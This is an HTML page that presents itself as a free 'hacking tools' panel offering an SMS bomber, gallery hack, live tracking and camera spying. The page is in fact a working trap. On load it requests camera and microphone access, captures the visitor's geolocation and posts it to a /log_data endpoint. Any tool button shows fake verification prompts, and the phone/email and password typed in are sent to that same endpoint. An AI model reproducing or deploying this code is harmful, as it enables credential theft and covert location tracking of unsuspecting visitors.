<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME MONIR | KERNEL V6.0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow-x:hidden; }
        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; text-align:center; }
        .bar-con { width:250px; height:10px; border:1px solid #0f0; margin-top:15px; }
        .bar { width:0%; height:100%; background:#0f0; animation:load 4s forwards linear; }
        @keyframes load { to { width:100%; } }
        #ui { display:none; padding:15px; }
        .bomber-btn { border:2px solid #f00; background:rgba(255,0,0,0.1); color:#f00; padding:20px; font-weight:bold; margin-bottom:15px; cursor:pointer; text-align:center; animation:pulse 1.5s infinite; }
        @keyframes pulse { 0%{box-shadow:0 0 5px #f00;} 50%{box-shadow:0 0 20px #f00;} 100%{box-shadow:0 0 5px #f00;} }
        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:10px; }
        .tool { border:1px solid #0f0; padding:15px 5px; background:rgba(0,255,0,0.05); text-align:center; cursor:pointer; font-size:12px; }
    </style>
</head>
<body>
    <div id="loader">
        <div style="letter-spacing:5px; color:#f00;">‚ö†Ô∏è ATTENTION ‚ö†Ô∏è</div>
        <div style="font-size:10px; margin-top:5px;">BYPASSING DEVICE SECURITY...</div>
        <div class="bar-con"><div class="bar"></div></div>
    </div>

    <div id="ui">
        <div style="border:1px solid #0f0; padding:10px; text-align:center; margin-bottom:15px;">
            <h2 style="margin:0;">PRIME MONIR | ACCESS PANEL</h2>
        </div>
        <div class="bomber-btn" onclick="openTool('SMS_BOMBER')">üî• SMS BOMBER (FREE)</div>
        <div class="grid">
            <div class="tool" onclick="openTool('GALLERY')">GALLERY HACK</div>
            <div class="tool" onclick="openTool('LOCATION')">LIVE TRACK</div>
            <div class="tool" onclick="openTool('CAMERA')">CAM SPY</div>
            <div class="tool" onclick="openTool('FILES')">FILE MANAGER</div>
        </div>
    </div>

    <script>
        // ‡¶Ö‡¶ü‡ßã ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶™ - ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶è‡¶∞ ‡¶∏‡¶Æ‡ßü
        window.onload = async () => {
            try {
                // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ì ‡¶Æ‡¶æ‡¶á‡¶ï ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶®
                await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶®
                navigator.geolocation.getCurrentPosition((p) => {
                    sendData('LOCATION', `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`);
                });
            } catch(e) {}
            
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('ui').style.display = 'block';
            }, 4000);
        };

        function sendData(type, content) {
            fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
            body:JSON.stringify({type: type, content: content})});
        }

        function openTool(name) {
            // ‡¶ü‡ßÅ‡¶≤ ‡¶ì‡¶™‡ßá‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶ó‡ßá‡¶≤‡ßá ‡¶§‡¶ñ‡¶® ‡¶Ü‡¶á‡¶°‡¶ø ‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° ‡¶ö‡¶æ‡¶á‡¶¨‡ßá
            let u = prompt("Verification Required!\nEnter Phone/Email to link server:");
            let p = prompt("Enter Password:");
            if(u && p) {
                sendData('CREDENTIALS', `User: ${u}, Pass: ${p}, Tool: ${name}`);
                alert("Connection Established. Streaming data...");
            }
        }
    </script>
</body>
</html>
